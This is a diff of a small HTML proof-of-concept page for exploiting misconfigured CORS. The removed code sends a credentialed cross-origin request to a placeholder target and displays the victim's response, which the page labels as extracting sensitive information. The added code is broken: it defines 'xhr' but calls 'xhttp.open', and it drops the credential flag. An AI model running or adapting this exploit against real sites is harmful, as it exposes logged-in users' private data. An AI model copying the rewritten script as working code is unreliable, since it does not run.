@@ -7,28 +7,30 @@
 	Licenses: https://opensource.org/licenses/MIT
 -->
 <body>
-    <div align="center">
-        <h2> CORS POC Exploit</h2>
-        <h3>Extract Sensitive Information</h3>
 
-        <div id="demo">
-            <button type="button" onclick="cors()">Exploit</button>
-        </div>
-    </div>
-    
-    <script>
-        function cors(){
-            var xhttp = new XMLHttpRequest();
-            xhttp.onreadystatechange = function(){
-                if(this.readyState == 4 && this.status == 200){
-                    document.getElementById("demo").innerHTML = alert(this.responseText);
-                }
-            };
-			// change http://domainexploit.name to vulnerability domain 
-            xhttp.open("GET", "http://domainexploit.name",true);
-            xhttp.withCredentials = true;
-            xhttp.send();
+<h3>CORS Exploit Demo</h3>
+
+<button onclick="exploit()">Exploit</button>
+
+<pre id="out">Waiting...</pre>
+
+<script>
+function exploit() {
+    document.getElementById("out").innerText = "Sending request...";
+
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+            document.getElementById("out").innerText =
+                "Status: " + xhr.status + "\n\n" + xhr.responseText;
         }
-    </script>
+    };
+
+    // change http://domainexploit.name to vulnerability domain 
+    xhttp.open("GET", "http://domainexploit.name",true);
+    xhr.send();
+}
+</script>
+
 </body>
 </html>
